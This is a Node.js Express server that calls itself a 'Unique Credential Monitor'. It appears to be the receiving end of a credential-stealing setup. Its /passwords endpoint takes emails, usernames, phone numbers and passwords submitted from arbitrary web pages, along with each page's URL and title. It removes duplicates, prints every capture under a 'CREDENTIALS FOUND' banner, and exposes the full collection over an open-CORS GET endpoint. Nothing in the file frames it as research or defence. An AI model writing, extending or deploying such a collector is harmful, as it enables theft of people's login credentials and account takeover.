const express = require('express');
const cors = require('cors');
const app = express();
const port = 3000;

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Store unique credentials only
let uniqueCredentials = new Map();
let lastDisplayedData = null;

// Helper function to repeat string
function repeat(str, count) {
  return Array(count + 1).join(str);
}

// Format timestamp
function formatTime(timestamp) {
  const date = new Date(timestamp);
  return date.toLocaleString('en-IN', { 
    hour: '2-digit', 
    minute: '2-digit', 
    second: '2-digit',
    day: '2-digit',
    month: '2-digit',
    year: 'numeric'
  });
}

// Generate unique key for credential
function generateCredentialKey(data) {
  const url = data.url || 'unknown';
  let values = [];
  
  if (data.credentials) {
    if (data.credentials.email) values.push(data.credentials.email);
    if (data.credentials.username) values.push(data.credentials.username);
    if (data.credentials.phone) values.push(data.credentials.phone);
    if (data.credentials.password) values.push(data.credentials.password);
  } else if (data.field_value) {
    values.push(data.field_value);
  }
  
  // Sort to ensure consistent key regardless of order
  values.sort();
  return `${url}|${values.join('|')}`;
}

// Auto detect field type based on value
function detectValueType(value) {
  if (!value) return 'unknown';
  
  const valueStr = String(value).toLowerCase().trim();
  
  // Email pattern
  if (/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(valueStr)) {
    return 'email';
  }
  
  // Phone pattern
  const digitsOnly = valueStr.replace(/\D/g, '');
  if (digitsOnly.length >= 8 && digitsOnly.length <= 15 && /^[\+]?[(]?[0-9]{1,4}[)]?[-\s\.]?[(]?[0-9]{1,4}[)]?[-\s\.]?[0-9]{1,5}[-\s\.]?[0-9]{1,5}$/.test(valueStr)) {
    return 'phone';
  }
  
  // Username pattern
  if (/^[a-zA-Z0-9_\.]{3,30}$/.test(valueStr) && !valueStr.includes('@') && isNaN(valueStr) && digitsOnly.length < 8) {
    return 'username';
  }
  
  return 'unknown';
}

// Display credentials function
function displayCredentials(data) {
  console.clear();
  
  // Display header
  console.log('\x1b[36m%s\x1b[0m', '╔' + repeat('═', 78) + '╗');
  console.log('\x1b[36m%s\x1b[0m', '║' + ' '.repeat(32) + '🔐 CREDENTIALS FOUND' + ' '.repeat(32) + '║');
  console.log('\x1b[36m%s\x1b[0m', '╚' + repeat('═', 78) + '╝');
  
  console.log('\x1b[33m%s\x1b[0m', repeat('─', 80));
  
  // Basic info
  console.log('\x1b[37m%s\x1b[0m', `📍 URL: ${data.url || 'N/A'}`);
  console.log('\x1b[37m%s\x1b[0m', `📄 Page: ${data.page_title || 'N/A'}`);
  console.log('\x1b[37m%s\x1b[0m', `⏰ Time: ${formatTime(data.timestamp || new Date())}`);
  
  console.log('\x1b[33m%s\x1b[0m', repeat('─', 80));
  
  // Display credentials based on type
  if (data.type === 'complete_credentials' && data.credentials) {
    console.log('\x1b[32m%s\x1b[0m', '📋 COMPLETE CREDENTIALS FOUND:');
    
    const displayedValues = new Set();
    
    if (data.credentials.email && !displayedValues.has(data.credentials.email)) {
      displayedValues.add(data.credentials.email);
      const type = detectValueType(data.credentials.email);
      const icon = type === 'email' ? '📧' : type === 'phone' ? '📱' : '👤';
      console.log(`   ${icon} ${type === 'email' ? 'Email' : type === 'phone' ? 'Phone' : 'Username'}: ${data.credentials.email}`);
    }
    
    if (data.credentials.username && !displayedValues.has(data.credentials.username)) {
      displayedValues.add(data.credentials.username);
      const type = detectValueType(data.credentials.username);
      const icon = type === 'email' ? '📧' : type === 'phone' ? '📱' : '👤';
      console.log(`   ${icon} ${type === 'email' ? 'Email' : type === 'phone' ? 'Phone' : 'Username'}: ${data.credentials.username}`);
    }
    
    if (data.credentials.phone && !displayedValues.has(data.credentials.phone)) {
      displayedValues.add(data.credentials.phone);
      const type = detectValueType(data.credentials.phone);
      const icon = type === 'email' ? '📧' : type === 'phone' ? '📱' : '👤';
      console.log(`   ${icon} ${type === 'email' ? 'Email' : type === 'phone' ? 'Phone' : 'Username'}: ${data.credentials.phone}`);
    }
    
    if (data.credentials.password) {
      console.log(`   🔑 Password: ${data.credentials.password}`);
    }
  }
  
  else if (data.type === 'form_submission_complete' && data.credentials) {
    console.log('\x1b[32m%s\x1b[0m', '📋 FORM SUBMISSION DETECTED:');
    
    const fields = [];
    const displayedValues = new Set();
    
    if (data.credentials.username && !displayedValues.has(data.credentials.username.value)) {
      displayedValues.add(data.credentials.username.value);
      fields.push({ value: data.credentials.username.value, type: 'username' });
    }
    
    if (data.credentials.email && !displayedValues.has(data.credentials.email.value)) {
      displayedValues.add(data.credentials.email.value);
      fields.push({ value: data.credentials.email.value, type: 'email' });
    }
    
    if (data.credentials.phone && !displayedValues.has(data.credentials.phone.value)) {
      displayedValues.add(data.credentials.phone.value);
      fields.push({ value: data.credentials.phone.value, type: 'phone' });
    }
    
    if (data.all_fields) {
      Object.entries(data.all_fields).forEach(([key, value]) => {
        if (!key.toLowerCase().includes('pass') && !key.toLowerCase().includes('pwd')) {
          if (!displayedValues.has(value)) {
            const type = detectValueType(value);
            if (type !== 'unknown') {
              displayedValues.add(value);
              fields.push({ value: value, type: type });
            }
          }
        }
      });
    }
    
    fields.forEach(field => {
      const icon = field.type === 'email' ? '📧' : field.type === 'phone' ? '📱' : '👤';
      const label = field.type === 'email' ? 'Email' : field.type === 'phone' ? 'Phone' : 'Username';
      console.log(`   ${icon} ${label}: ${field.value}`);
    });
    
    if (data.credentials.password && !displayedValues.has(data.credentials.password.value)) {
      console.log(`   🔑 Password: ${data.credentials.password.value}`);
    }
  }
  
  else if (data.field_value) {
    const type = detectValueType(data.field_value);
    let icon = '📝';
    let label = 'Value';
    
    if (type === 'email') {
      icon = '📧';
      label = 'Email';
    } else if (type === 'phone') {
      icon = '📱';
      label = 'Phone';
    } else if (type === 'username') {
      icon = '👤';
      label = 'Username';
    } else if (data.field_type === 'password' || data.field_value.length < 20) {
      icon = '🔑';
      label = 'Password';
    }
    
    console.log(`   ${icon} ${label}: ${data.field_value}`);
  }
  
  console.log('\x1b[33m%s\x1b[0m', repeat('─', 80));
  console.log(`📊 Total unique captures: ${uniqueCredentials.size}`);
  console.log('\x1b[36m%s\x1b[0m', '╔' + repeat('═', 78) + '╗');
  console.log('\x1b[36m%s\x1b[0m', '║' + ' '.repeat(37) + 'READY' + ' '.repeat(37) + '║');
  console.log('\x1b[36m%s\x1b[0m', '╚' + repeat('═', 78) + '╝');
}

app.post('/passwords', (req, res) => {
  const data = req.body;
  const key = generateCredentialKey(data);
  
  // Only add and display if it's a new unique credential
  if (!uniqueCredentials.has(key)) {
    uniqueCredentials.set(key, data);
    displayCredentials(data);
    console.log(`\x1b[32m✅ New credential captured! Total: ${uniqueCredentials.size}\x1b[0m`);
  }
  
  res.json({ status: 'ok', count: uniqueCredentials.size });
});

app.get('/passwords', (req, res) => {
  const credentialsArray = Array.from(uniqueCredentials.values());
  res.json({
    total: credentialsArray.length,
    credentials: credentialsArray
  });
});

app.delete('/passwords', (req, res) => {
  uniqueCredentials.clear();
  console.clear();
  console.log('\x1b[32m%s\x1b[0m', '╔' + repeat('═', 78) + '╗');
  console.log('\x1b[32m%s\x1b[0m', '║' + ' '.repeat(35) + '🧹 ALL CLEARED' + ' '.repeat(35) + '║');
  console.log('\x1b[32m%s\x1b[0m', '╚' + repeat('═', 78) + '╝');
  console.log('\x1b[33m%s\x1b[0m', '\n⏳ Waiting for new credentials...\n');
  res.json({ status: 'cleared', message: 'All credentials cleared' });
});

// Health check endpoint
app.get('/health', (req, res) => {
  res.json({ 
    status: 'running', 
    timestamp: new Date().toISOString(),
    total_unique_captures: uniqueCredentials.size
  });
});

app.listen(port, '0.0.0.0', () => {
  console.log('\x1b[32m%s\x1b[0m', '╔' + repeat('═', 78) + '╗');
  console.log('\x1b[32m%s\x1b[0m', '║' + ' '.repeat(28) + '🚀 UNIQUE CREDENTIAL MONITOR' + ' '.repeat(28) + '║');
  console.log('\x1b[32m%s\x1b[0m', '╚' + repeat('═', 78) + '╝');
  
  console.log('\x1b[36m%s\x1b[0m', `\n📡 Server: http://localhost:${port}`);
  console.log('\x1b[36m%s\x1b[0m', `📱 Auto-detecting: Emails, Phones, Usernames, Passwords`);
  console.log('\x1b[36m%s\x1b[0m', `🔢 Counter: Shows only when new credential arrives\n`);
  
  console.log('\x1b[33m%s\x1b[0m', '⏳ Waiting for first credential...\n');
});
